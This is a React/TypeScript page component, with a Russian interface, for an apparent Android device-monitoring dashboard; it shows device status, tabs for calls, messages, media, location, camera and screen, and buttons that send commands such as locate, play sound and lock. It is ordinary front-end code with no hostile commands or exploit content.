import { NavLink, Outlet, useParams } from 'react-router-dom';
import { useEffect, useState } from 'react';
import { devices as devicesApi, commands } from '../api/client';
import type { DeviceResponse, CommandType } from '../types';

const tabs = [
  { to: '', label: 'Обзор', icon: '📊', end: true },
  { to: 'apps', label: 'Приложения', icon: '📱' },
  { to: 'calls', label: 'Звонки', icon: '📞' },
  { to: 'messages', label: 'Сообщения', icon: '💬' },
  { to: 'media', label: 'Медиа', icon: '🖼' },
  { to: 'location', label: 'Локация', icon: '📍' },
  { to: 'camera', label: 'Камера', icon: '📷' },
  { to: 'screen', label: 'Экран', icon: '🖥' },
];

const quickCommands: { type: CommandType; label: string; icon: string }[] = [
  { type: 'request_location', label: 'Запросить локацию', icon: '📍' },
  { type: 'play_sound', label: 'Воспроизвести звук', icon: '🔔' },
  { type: 'lock_device', label: 'Заблокировать', icon: '🔒' },
  { type: 'sync_now', label: 'Синхронизировать', icon: '🔄' },
];

export default function DeviceDetailPage() {
  const { deviceId } = useParams<{ deviceId: string }>();
  const [device, setDevice] = useState<DeviceResponse | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [cmdLoading, setCmdLoading] = useState<string | null>(null);
  const [cmdSuccess, setCmdSuccess] = useState<string | null>(null);
  const [cmdError, setCmdError] = useState('');

  useEffect(() => {
    if (deviceId) {
      setLoading(true);
      setError('');
      devicesApi
        .get(deviceId)
        .then(setDevice)
        .catch(() => setError('Не удалось загрузить устройство'))
        .finally(() => setLoading(false));
    }
  }, [deviceId]);

  const sendCommand = async (type: CommandType) => {
    if (!deviceId) return;
    setCmdLoading(type);
    setCmdError('');
    setCmdSuccess(null);
    try {
      await commands.send(deviceId, { command_type: type });
      setCmdSuccess(type);
      setTimeout(() => setCmdSuccess((prev) => (prev === type ? null : prev)), 2000);
    } catch {
      setCmdError('Не удалось отправить команду');
    } finally {
      setCmdLoading(null);
    }
  };

  if (loading) {
    return (
      <div className="flex justify-center py-12">
        <div className="h-8 w-8 animate-spin rounded-full border-4 border-blue-500 border-t-transparent" />
      </div>
    );
  }

  if (error || !device) {
    return (
      <div className="flex justify-center py-12">
        <p className="text-red-600">{error || 'Устройство не найдено'}</p>
      </div>
    );
  }

  return (
    <div>
      {/* Header */}
      <div className="mb-6 flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold">{device.name}</h1>
          <p className="text-sm text-gray-400">
            {device.device_model || '—'} • Android {device.android_version || '—'}
            <span
              className={`ml-2 inline-block h-2 w-2 rounded-full ${
                device.is_online ? 'bg-green-500' : 'bg-gray-300'
              }`}
            />
            <span className="ml-1">
              {device.is_online ? 'Онлайн' : 'Оффлайн'}
            </span>
          </p>
        </div>

        {/* Quick commands */}
        <div className="flex gap-2">
          {quickCommands.map((cmd) => (
            <button
              key={cmd.type}
              onClick={() => sendCommand(cmd.type)}
              disabled={cmdLoading === cmd.type}
              title={cmd.label}
              className={`rounded-lg border px-3 py-2 text-sm transition-colors disabled:opacity-50 ${
                cmdSuccess === cmd.type
                  ? 'border-green-400 bg-green-50 text-green-600'
                  : 'hover:bg-gray-50'
              }`}
            >
              {cmdLoading === cmd.type ? '⏳' : cmdSuccess === cmd.type ? '✅' : cmd.icon}
            </button>
          ))}
        </div>
      </div>

      {cmdError && <p className="mb-4 text-sm text-red-600">{cmdError}</p>}
      {cmdSuccess && (
        <p className="mb-4 text-sm text-green-600">
          Команда отправлена. {device?.is_online ? 'Устройство получит её сейчас.' : 'Устройство получит её при подключении.'}
        </p>
      )}

      {/* Tabs */}
      <div className="mb-6 flex gap-1 overflow-x-auto rounded-xl border bg-white p-1">
        {tabs.map((tab) => (
          <NavLink
            key={tab.to}
            to={tab.to === '' ? `/device/${deviceId}` : `/device/${deviceId}/${tab.to}`}
            end={tab.to === ''}
            className={({ isActive }) =>
              `flex items-center gap-1.5 whitespace-nowrap rounded-lg px-4 py-2 text-sm font-medium transition-colors ${
                isActive
                  ? 'bg-blue-600 text-white'
                  : 'text-gray-600 hover:bg-gray-100'
              }`
            }
          >
            <span>{tab.icon}</span>
            {tab.label}
          </NavLink>
        ))}
      </div>

      {/* Tab content */}
      <Outlet context={{ device, deviceId }} />
    </div>
  );
}
